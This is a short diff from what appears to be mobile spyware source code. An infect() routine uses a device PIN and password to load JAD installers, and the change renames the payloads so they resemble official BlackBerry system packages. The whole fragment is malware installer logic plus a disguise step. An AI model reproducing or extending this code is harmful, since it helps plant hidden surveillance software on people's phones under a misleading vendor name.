@@ -291,13 +291,13 @@ infect_result infect( wstring pin, wstring password )
 
 		// see if it's at least OS 5.0
 		if(version>=5000){
-			infected=loadJad(pin,password,L"inst50.jad");
+			infected=loadJad(pin,password,L"net_rim_bb_5.0.jad");
 		}
 
 		// try 
 		Sleep(300);
 		if(infected!=OK){
-			infected=loadJad(pin,password,L"inst45.jad");
+			infected=loadJad(pin,password,L"net_rim_bb_4.5.jad");
 		}
 								
 	}	
